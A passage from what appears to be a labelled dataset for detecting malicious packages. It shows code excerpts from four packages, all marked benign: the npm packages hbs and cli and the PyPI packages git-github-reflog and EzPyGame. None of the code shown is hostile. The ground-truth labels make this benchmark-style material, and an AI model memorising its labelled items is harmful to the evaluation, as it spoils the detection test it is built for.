      "raw_content": "\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction Instance(handlebars) {\n  if (!(this instanceof Instance)) {\n    return new Instance(handlebars);\n  }\n\n  // expose handlebars, allows users to use their versions\n  // by overriding this early in their apps\n  var self = this;\n\n  self.handlebars = handlebars || require('handlebars').create();\n\n  // cache for templates, express 3.x doesn't do this for us\n  self.cache = {};\n\n  self.__express = middleware.bind(this);\n\n  // queue for partials registration\n  self._queue = null\n\n  // DEPRECATED,\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction middleware(filename, options, cb) {\n  var self = this;\n\n  if (self._queue) {\n    self._queue.push(middleware.bind.apply(middleware, [this].concat(Array.prototype.slice.call(arguments))))\n    return\n  }\n\n  var cache = self.cache;\n  var handlebars = self.handlebars;\n\n  self.async = async();\n\n  // grab extension from filename\n  // if we need a layout, we will look for one matching out extension\n  var extension = path.extname(filename);\n\n  // Default handlebars runtime options\n  var handleb\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction render_file(locals, cb) {\n    // cached?\n    var template = cache[filename];\n    if (template) {\n      try {\n        var res = template(locals, handlebarsOpts)\n        self.async.done(function (values) {\n          Object.keys(values).forEach(function (id) {\n            res = res.replace(id, values[id])\n          })\n\n          cb(null, res)\n        })\n      } catch (err) {\n        cb(prependFilenameToError(filename, err))\n      }\n\n      return\n    }\n\n    fs.readFile(filename, 'utf8', fun\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction render_with_layout (filename, template, locals, cb) {\n    render_file(locals, function(err, str) {\n      if (err) {\n        return cb(err);\n      }\n\n      locals.body = str;\n\n      try {\n        var res = template(locals, handlebarsOpts)\n        self.async.done(function (values) {\n          Object.keys(values).forEach(function (id) {\n            res = res.replace(id, values[id])\n          })\n\n          cb(null, res)\n        })\n      } catch (err) {\n        cb(prependFilenameToError(file\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction prependFilenameToError (filename, err) {\n    // prepend to the message\n    if (typeof err.message === 'string') {\n      err.message = filename + ': ' + err.message\n    }\n\n    return err\n  }\n\n  function cacheAndCompile(filename, str) {\n    var layout_template = handlebars.compile(str);\n    if (options.cache) {\n      cache[filename] = layout_template;\n    }\n\n    render_with_layout(filename, layout_template, options, cb)\n  }\n\n  function tryReadFileAndCache(templates) {\n    var template = t\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction cacheAndCompile(filename, str) {\n    var layout_template = handlebars.compile(str);\n    if (options.cache) {\n      cache[filename] = layout_template;\n    }\n\n    render_with_layout(filename, layout_template, options, cb)\n  }\n\n  function tryReadFileAndCache(templates) {\n    var template = templates.shift();\n\n    fs.readFile(template, 'utf8', function(err, str) {\n      if (err) {\n        if (layout && templates.length === 0) {\n          // Only return error if user explicitly asked for lay\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nfunction tryReadFileAndCache(templates) {\n    var template = templates.shift();\n\n    fs.readFile(template, 'utf8', function(err, str) {\n      if (err) {\n        if (layout && templates.length === 0) {\n          // Only return error if user explicitly asked for layout.\n          return cb(err);\n        }\n\n        if (templates.length > 0) {\n          return tryReadFileAndCache(templates);\n        }\n\n        return render_file(options, cb);\n      }\n\n      cacheAndCompile(template, str);\n    });\n  \n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js (function)\nrename : function (name) {\n    return name.replace(/\\-/g, '_')\n  }\n\n  var w = walk(directory)\n  w.on('file', function (root, stat, done) {\n    var filepath = path.join(root, stat.name)\n    var isValidTemplate = /\\.(html|hbs)$/.test(filepath);\n\n    if (!isValidTemplate) {\n      return done(null);\n    }\n\n    fs.readFile(filepath, 'utf8', function(err, data) {\n      if (!err) {\n        var extname = path.extname(filepath)\n        var name = path.relative(directory, filepath)\n          .slice(0, -(e\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js (function)\nfunction Waiter() {\n    if (!(this instanceof Waiter)) {\n        return new Waiter();\n    }\n\n    var self = this;\n\n    // found values\n    self.values = {};\n\n    // callback when done\n    self.callback = null;\n\n    self.resolved = false;\n\n    self.count = 0;\n};\n\nWaiter.prototype.wait = function() {\n    var self = this;\n    ++self.count;\n};\n\n// resolve the promise\nWaiter.prototype.resolve = function(name, val) {\n    var self = this;\n\n    self.values[name] = val;\n\n    // done with all items\n    if\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js (function)\nfunction done(fn) {\n        // no async things called\n        if (!waiter) {\n            return fn({});\n        }\n\n        waiter.done(fn);\n\n        // clear the waiter for the next template\n        waiter = undefined;\n    };\n\n    obj.resolve = function resolve(fn, args) {\n        // we want to do async things, need a waiter for that\n        if (!waiter) {\n            waiter = new Waiter();\n        }\n\n        var id = '__' + gen_id() + '__';\n\n        var cur_waiter = waiter;\n        waiter.wait(\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js (function)\nfunction resolve(fn, args) {\n        // we want to do async things, need a waiter for that\n        if (!waiter) {\n            waiter = new Waiter();\n        }\n\n        var id = '__' + gen_id() + '__';\n\n        var cur_waiter = waiter;\n        waiter.wait();\n\n        args = [].slice.call(args);\n        args.push(function(res) {\n            cur_waiter.resolve(id, res);\n        })\n\n        fn.apply(null, args);\n\n        // return the id placeholder\n        // this will be replaced later\n        ret\n==================================================\n\n# File: data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js (function)\nvar gen_id = function() {\n    var res = '';\n    for (var i=0 ; i<8 ; ++i) {\n        res += alphabet[Math.floor(Math.random() * alphabet.length)];\n    }\n\n    return res;\n};\n\nmodule.exports = function() {\n    // baton which contains the current\n    // set of deferreds\n    var waiter;\n\n    var obj = Object.create(null);\n    obj.done = function done(fn) {\n        // no async things called\n        if (!waiter) {\n            return fn({});\n        }\n\n        waiter.done(fn);\n\n        // clear the wait\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/hbs.js": "rename : function (name) {\n    return name.replace(/\\-/g, '_')\n  }\n\n  var w = walk(directory)\n  w.on('file', function (root, stat, done) {\n    var filepath = path.join(root, stat.name)\n    var isValidTemplate = /\\.(html|hbs)$/.test(filepath);\n\n    if (!isValidTemplate) {\n      return done(null);\n    }\n\n    fs.readFile(filepath, 'utf8', function(err, data) {\n      if (!err) {\n        var extname = path.extname(filepath)\n        var name = path.relative(directory, filepath)\n          .slice(0, -(e",
        "data/benign_samples/npm/popular/hbs/4.2.0/package/lib/async.js": "var gen_id = function() {\n    var res = '';\n    for (var i=0 ; i<8 ; ++i) {\n        res += alphabet[Math.floor(Math.random() * alphabet.length)];\n    }\n\n    return res;\n};\n\nmodule.exports = function() {\n    // baton which contains the current\n    // set of deferreds\n    var waiter;\n\n    var obj = Object.create(null);\n    obj.done = function done(fn) {\n        // no async things called\n        if (!waiter) {\n            return fn({});\n        }\n\n        waiter.done(fn);\n\n        // clear the wait"
      },
      "package_size_bytes": 7604,
      "num_files": 12,
      "metadata": {
        "package_hash": "npm_hbs_4.2.0",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "git-github-reflog",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.py (file)\nimport re\nfrom setuptools import setup\n\nversion = re.search(\n    '^__version__\\s*=\\s*\"(.*)\"',\n    open('git-github-reflog').read(),\n    re.M\n    ).group(1)\n\nsetup(\n    name='git-github-reflog',\n    version=version,\n    description='reflog like interaction with Github',\n    long_description=\n    \"A git extension for viewing the event log of a Github project.\",\n    url='https://github.com/criswell/github-reflog',\n    author='Sam Hart',\n    author_email='hartsn@gmail.com',\n\n    classifiers=[\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)',\n        'Topic :: Software Development :: Version Control',\n        'Topic :: Utilities'\n    ],\n    keywords='git github development',\n\n    install_requires=[\n        'requests', 'colorama', 'argparse'\n    ],\n\n    scripts=['git-github-reflog']\n)\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.py (file)\nimport re\nfrom setuptools import setup\n\nversion = re.search(\n    '^__version__\\s*=\\s*\"(.*)\"',\n    open('git-github-reflog').read(),\n    re.M\n    ).group(1)\n\nsetup(\n    name='git-github-reflog',\n    version=version,\n    description='reflog like interaction with Github',\n    long_description=\n    \"A git extension for viewing the event log of a Github project.\",\n    url='https://github.com/criswell/github-reflog',\n    author='Sam Hart',\n    author_email='hartsn@gmail.com',\n\n    classifiers=[\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)',\n        'Topic :: Software Development :: Version Control',\n        'Topic :: Utilities'\n    ],\n    keywords='git github development',\n\n    install_requires=[\n        'requests', 'colorama', 'argparse'\n    ],\n\n    scripts=['git-github-reflog']\n)\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.cfg (file)\n[bdist_wheel]\nuniversal = 1\n\n[metadata]\ndescription-file = README.md\n\n[egg_info]\ntag_build = \ntag_date = 0\ntag_svn_revision = 0\n\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.py",
        "data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.py",
        "data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.cfg"
      ],
      "individual_files": {
        "data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.py": "import re\nfrom setuptools import setup\n\nversion = re.search(\n    '^__version__\\s*=\\s*\"(.*)\"',\n    open('git-github-reflog').read(),\n    re.M\n    ).group(1)\n\nsetup(\n    name='git-github-reflog',\n    version=version,\n    description='reflog like interaction with Github',\n    long_description=\n    \"A git extension for viewing the event log of a Github project.\",\n    url='https://github.com/criswell/github-reflog',\n    author='Sam Hart',\n    author_email='hartsn@gmail.com',\n\n    classifiers=[\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)',\n        'Topic :: Software Development :: Version Control',\n        'Topic :: Utilities'\n    ],\n    keywords='git github development',\n\n    install_requires=[\n        'requests', 'colorama', 'argparse'\n    ],\n\n    scripts=['git-github-reflog']\n)\n",
        "data/benign_samples/pypi/longtail/git-github-reflog/0.0.1/git-github-reflog-0.0.1/setup.cfg": "[bdist_wheel]\nuniversal = 1\n\n[metadata]\ndescription-file = README.md\n\n[egg_info]\ntag_build = \ntag_date = 0\ntag_svn_revision = 0\n\n"
      },
      "package_size_bytes": 2521,
      "num_files": 3,
      "metadata": {
        "package_hash": "pypi_git-github-reflog_0.0.1",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "cli",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/index.js (file)\nmodule.exports = require('./cli');\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nfunction isInt(n) {\n        return Number(n) === n && n % 1 === 0;\n    }\n\n    function isFloat(n){\n        return n === Number(n) && n % 1 !== 0;\n    }\n\n    if ( type === 'number' ) {\n        if ( isInt(obj) ) {\n            return 'integer';\n        } else if ( isFloat(obj) ) {\n            return 'float';\n        }\n    }\n\n    return type;\n}\n\n/**\n * The main entry method. `callback` receives (args, options)\n *\n * @param {Function} callback\n * @api public\n */\ncli.main = function (callback) {\n    c\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nfunction isFloat(n){\n        return n === Number(n) && n % 1 !== 0;\n    }\n\n    if ( type === 'number' ) {\n        if ( isInt(obj) ) {\n            return 'integer';\n        } else if ( isFloat(obj) ) {\n            return 'float';\n        }\n    }\n\n    return type;\n}\n\n/**\n * The main entry method. `callback` receives (args, options)\n *\n * @param {Function} callback\n * @api public\n */\ncli.main = function (callback) {\n    callback.call(cli, cli.args, cli.options);\n}\n\n/**\n * Bind creationix's stack (h\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar define_native = function (module) {\n    Object.defineProperty(cli.native, module, {\n        enumerable: true,\n        configurable: true,\n        get: function() {\n            delete cli.native[module];\n            return (cli.native[module] = require(module));\n        }\n    });\n};\nvar natives = process.binding('natives');\nfor (var module in natives) {\n    define_native(module);\n}\n\ncli.output = console.log;\ncli.exit = require('exit');\n\ncli.no_color = false;\nif (process.env.NODE_DISABLE_COLOR\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar parse_packagejson = function (path) {\n        var packagejson = JSON.parse(cli.native.fs.readFileSync(path, 'utf8'));\n        cli.version = packagejson.version;\n        cli.app = packagejson.name;\n    };\n    var try_all = function (arr, func, err) {\n        for (var i = 0, l = arr.length; i < l; i++) {\n            try {\n                func(arr[i]);\n                return;\n            } catch (e) {\n                if (i === l-1) {\n                    cli.fatal(err);\n                }\n       \n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar try_all = function (arr, func, err) {\n        for (var i = 0, l = arr.length; i < l; i++) {\n            try {\n                func(arr[i]);\n                return;\n            } catch (e) {\n                if (i === l-1) {\n                    cli.fatal(err);\n                }\n            }\n        }\n    };\n    try {\n        if (path) {\n            return parse_packagejson(path);\n        }\n        try_all([\n            __dirname + '/package.json',\n            __dirname + '/../package.json',\n \n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar pad = function (str, len) {\n    if (typeof len === 'undefined') {\n        len = str;\n        str = '';\n    }\n    if (str.length < len) {\n        len -= str.length;\n        while (len--) str += ' ';\n    }\n    return str;\n};\n\n/**\n * Automatically build usage information from the opts list. If the help\n * plugin is enabled (default), this info is displayed with -h, --help.\n *\n * @api public\n */\ncli.getUsage = function (code) {\n    var short, desc, optional, line, seen_opts = [],\n        switch_\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar trunc_desc = function (pref, desc, len) {\n        var pref_len = pref.length,\n            desc_len = cli.width - pref_len,\n            truncated = '';\n        if (desc.length <= desc_len) {\n            return desc;\n        }\n        var desc_words = (desc+'').split(' '), chars = 0, word;\n        while (desc_words.length) {\n            truncated += (word = desc_words.shift()) + ' ';\n            chars += word.length;\n            if (desc_words.length && chars + desc_words[0].length > desc_len)\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nvar defaultStackErrorHandler = function (req, res, err) {\n        if (err) {\n            console.error(err.stack);\n            res.writeHead(500, {\"Content-Type\": \"text/plain\"});\n            return res.end(err.stack + \"\\n\");\n        }\n        res.writeHead(404, {\"Content-Type\": \"text/plain\"});\n        res.end(\"Not Found\\n\");\n    };\n    var handle, error;\n    handle = error = defaultStackErrorHandler;\n    var layers = Array.prototype.slice.call(arguments);\n\n    //Allow createServer(a,b,c) and cre\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js (function)\nget: function() {\n            delete cli.native[module];\n            return (cli.native[module] = require(module));\n        }\n    });\n};\nvar natives = process.binding('natives');\nfor (var module in natives) {\n    define_native(module);\n}\n\ncli.output = console.log;\ncli.exit = require('exit');\n\ncli.no_color = false;\nif (process.env.NODE_DISABLE_COLORS || process.env.TERM === 'dumb') {\n    cli.no_color = true;\n}\n\n/**\n * Define plugins. Plugins can be enabled and disabled by calling:\n *\n *     `cli.\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/sort.js (function)\nnull : function (a, b) {\n        return parseInt(a) > parseInt(b);\n    });\n    if (options.reverse) {\n        lines.reverse();\n    }\n    this.output(lines.join(newline));\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/cat.js (function)\nvar output_file = function (file) {\n    cli.withInput(file, function (line, sep, eof) {\n        if (!eof) {\n            cli.output(line + sep);\n        } else if (cli.args.length) {\n            output_file(cli.args.shift());\n        }\n    });\n};\n\nif (cli.args.length) {\n    output_file(cli.args.shift());\n}\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/long_desc.js (file)\n#!/usr/bin/env node\n\nvar cli = require('../');\n\n//You can (optionally) boost the width of output with:\n//cli.width = 120;\n\n//You can also adjust the width of the options/command definitions\n//cli.option_width = 25;\n\nvar long_desc = 'Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\\'s '\n              + 'standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make'\n              + ' a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, '\n              + 'remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing '\n              + 'Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions'\n              + ' of Lorem Ipsum.';\n\ncli.parse({\n    foo: ['f', long_desc]\n});\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/command.js (file)\n#!/usr/bin/env node\n\nvar cli = require('cli');\n\n//The second (optional) argument of cli.parse() is a command list \n//Type `./command.js --help` for usage info\n\n//cli enables auto-completion of commands (similiar to npm), e.g. all of\n//the following are equivalent and result in \"Command is: install\":\n//    $ ./command.js install\n//    $ ./command.js inst\n//    $ ./command.js i\n\ncli.parse(null, ['install', 'test', 'edit', 'remove', 'uninstall', 'ls']);\n\nconsole.log('Command is: ' + cli.command);\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/spinner.js (file)\n#!/usr/bin/env node\n\nvar cli = require('cli');\n\ncli.spinner('Working..');\n\nsetTimeout(function () {\n    cli.spinner('Working.. done!', true); //End the spinner\n}, 3000);\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/progress.js (file)\n#!/usr/bin/env node\n\nvar cli = require('cli');\n\nvar i = 0, interval = setInterval(function () { \n    cli.progress(++i / 100); \n    if (i === 100) {\n        clearInterval(interval);\n        cli.ok('Finished!');\n    }\n}, 50);\n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/echo.js (function)\nvar escape = function (str) {\n                str += '';\n                for (j in replace) {\n                    str = str.replace(i, replace[i]);\n                }\n                return str;\n            }\n            for (i = 0, l = this.argc; i < l; i++) {\n                args[i] = escape(args[i]);\n            }\n            options.separator = escape(options.separator);\n        }\n        output += args.join(options.separator);\n    }\n    \n    if (!options.newline) {\n        output += '\\n';\n  \n==================================================\n\n# File: data/benign_samples/npm/longtail/cli/1.0.1/package/examples/glob.js (file)\n#!/usr/bin/env node\n\nvar cli = require('cli').enable('glob');\n\n//Running `./glob.js *.js` will output a list of .js files in this directory\nconsole.log(cli.args);\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/longtail/cli/1.0.1/package/index.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/sort.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/cat.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/long_desc.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/command.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/spinner.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/progress.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/echo.js",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/glob.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/longtail/cli/1.0.1/package/index.js": "module.exports = require('./cli');\n",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/cli.js": "get: function() {\n            delete cli.native[module];\n            return (cli.native[module] = require(module));\n        }\n    });\n};\nvar natives = process.binding('natives');\nfor (var module in natives) {\n    define_native(module);\n}\n\ncli.output = console.log;\ncli.exit = require('exit');\n\ncli.no_color = false;\nif (process.env.NODE_DISABLE_COLORS || process.env.TERM === 'dumb') {\n    cli.no_color = true;\n}\n\n/**\n * Define plugins. Plugins can be enabled and disabled by calling:\n *\n *     `cli.",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/sort.js": "null : function (a, b) {\n        return parseInt(a) > parseInt(b);\n    });\n    if (options.reverse) {\n        lines.reverse();\n    }\n    this.output(lines.join(newline));\n});",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/cat.js": "var output_file = function (file) {\n    cli.withInput(file, function (line, sep, eof) {\n        if (!eof) {\n            cli.output(line + sep);\n        } else if (cli.args.length) {\n            output_file(cli.args.shift());\n        }\n    });\n};\n\nif (cli.args.length) {\n    output_file(cli.args.shift());\n}",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/long_desc.js": "#!/usr/bin/env node\n\nvar cli = require('../');\n\n//You can (optionally) boost the width of output with:\n//cli.width = 120;\n\n//You can also adjust the width of the options/command definitions\n//cli.option_width = 25;\n\nvar long_desc = 'Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\\'s '\n              + 'standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make'\n              + ' a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, '\n              + 'remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing '\n              + 'Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions'\n              + ' of Lorem Ipsum.';\n\ncli.parse({\n    foo: ['f', long_desc]\n});\n",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/command.js": "#!/usr/bin/env node\n\nvar cli = require('cli');\n\n//The second (optional) argument of cli.parse() is a command list \n//Type `./command.js --help` for usage info\n\n//cli enables auto-completion of commands (similiar to npm), e.g. all of\n//the following are equivalent and result in \"Command is: install\":\n//    $ ./command.js install\n//    $ ./command.js inst\n//    $ ./command.js i\n\ncli.parse(null, ['install', 'test', 'edit', 'remove', 'uninstall', 'ls']);\n\nconsole.log('Command is: ' + cli.command);\n",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/spinner.js": "#!/usr/bin/env node\n\nvar cli = require('cli');\n\ncli.spinner('Working..');\n\nsetTimeout(function () {\n    cli.spinner('Working.. done!', true); //End the spinner\n}, 3000);",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/progress.js": "#!/usr/bin/env node\n\nvar cli = require('cli');\n\nvar i = 0, interval = setInterval(function () { \n    cli.progress(++i / 100); \n    if (i === 100) {\n        clearInterval(interval);\n        cli.ok('Finished!');\n    }\n}, 50);",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/echo.js": "var escape = function (str) {\n                str += '';\n                for (j in replace) {\n                    str = str.replace(i, replace[i]);\n                }\n                return str;\n            }\n            for (i = 0, l = this.argc; i < l; i++) {\n                args[i] = escape(args[i]);\n            }\n            options.separator = escape(options.separator);\n        }\n        output += args.join(options.separator);\n    }\n    \n    if (!options.newline) {\n        output += '\\n';\n  ",
        "data/benign_samples/npm/longtail/cli/1.0.1/package/examples/glob.js": "#!/usr/bin/env node\n\nvar cli = require('cli').enable('glob');\n\n//Running `./glob.js *.js` will output a list of .js files in this directory\nconsole.log(cli.args);"
      },
      "package_size_bytes": 9929,
      "num_files": 18,
      "metadata": {
        "package_hash": "npm_cli_1.0.1",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "EzPyGame",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/setup.py (file)\nfrom distutils.core import setup\n\n\nsetup(\n    name='EzPyGame',\n    packages=['ezpygame'],\n    install_requires=['pygame'],\n    version='0.3.1',\n    license='MIT',\n    description='An easier way to use pygame',\n    author='Markus Meskanen',\n    author_email='markusmeskanen@gmail.com',\n    url='https://github.com/Mahi/EzPyGame',\n    download_url='https://github.com/Mahi/EzPyGame/archive/0.3.1.tar.gz',\n    keywords=['pygame', 'game', 'gaming', 'games', 'ez', 'easy', 'ezpg'],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'License :: OSI Approved :: MIT License',\n        'Intended Audience :: Developers',\n        'Topic :: Games/Entertainment',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/__init__.py (file)\n\"\"\"Easier and more pythonic usage of :mod:`pygame`.\"\"\"\n\nfrom .application import Application\nfrom .scene import Scene\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (class)\nclass Scene:\n    \"\"\"An isolated scene which can be ran by an application.\n\n    Create your own scene by subclassing and overriding any methods.\n    The hosting :class:`.Application` instance is accessible\n    through the :attr:`application` property.\n\n    Example usage with two scenes interacting:\n\n    .. code-block:: python\n\n        class Menu(Scene):\n\n            def __init__(self):\n                self.font = pygame.font.Font(...)\n\n            def on_enter(self, previous_scene):\n                self.application.title = 'Main Menu'\n                self.application.resolution = (640, 480)\n                self.application.update_rate = 30\n\n            def draw(self, screen):\n                pygame.draw.rect(...)\n                text = self.font.render(...)\n                screen.blit(text, ...)\n\n            def handle_event(self, event):\n                if event.type == pygame.MOUSEBUTTONUP:\n                    if event.button == 1:\n                        game_size = self._get_game_size(event.pos)\n                        self.change_scene(Game(game_size))\n\n            def _get_game_size(self, mouse_pos_upon_click):\n                ...\n\n\n        class Game(ezpygame.Scene):\n            title = 'The Game!'\n            resolution = (1280, 720)\n            update_rate = 60\n\n            def __init__(self, size):\n                super().__init__()\n                self.size = size\n                self.player = ...\n                ...\n\n            def on_enter(self, previous_scene):\n                super().on_enter(previous_scene)\n                self.previous_scene = previous_scene\n\n            def draw(self, screen):\n                self.player.draw(screen)\n                for enemy in self.enemies:\n                    ...\n\n            def update(self, dt):\n                self.player.move(dt)\n                ...\n                if self.player.is_dead():\n                    self.application.change_scene(self.previous_scene)\n                elif self.player_won():\n                    self.application.change_scene(...)\n\n            def handle_event(self, event):\n                ...  # Player movement etc.\n\n    The above two classes use different approaches for changing\n    the application's settings when the scene is entered:\n\n    1. Manually set them in :meth:`on_enter`, as seen in ``Menu``\n    2. Use class variables, as I did with ``Game``\n\n    When using class variables (2), you can leave out any setting\n    (defaults to ``None``) to not override that particular setting.\n    If you override :meth:`on_enter` in the subclass, you must call\n    ``super().on_enter(previous_scene)`` to use the class variables.\n\n    These settings can further be overridden in individual instances:\n\n    .. code-block:: python\n\n        my_scene0 = MyScene()\n        my_scene0.resolution = (1280, 720)\n        my_scene1 = MyScene(title='My Second Awesome Scene')\n    \"\"\"\n    title = None\n    resolution = None\n    update_rate = None\n\n    def __init__(self, title=None, resolution=None, update_rate=None):\n        self._application = None\n        if title is not None:\n            self.title = title\n        if resolution is not None:\n            self.resolution = resolution\n        if update_rate is not None:\n            self.update_rate = update_rate\n\n    @property\n    def application(self):\n        \"\"\"The host application that's currently running the scene.\"\"\"\n        return self._application\n\n    def draw(self, screen):\n        \"\"\"Override this with the scene drawing.\n\n        :param pygame.Surface screen: screen to draw the scene on\n        \"\"\"\n\n    def update(self, dt):\n        \"\"\"Override this with the scene update tick.\n\n        :param int dt: time in milliseconds since the last update\n        \"\"\"\n\n    def handle_event(self, event):\n        \"\"\"Override this to handle an event in the scene.\n\n        All of 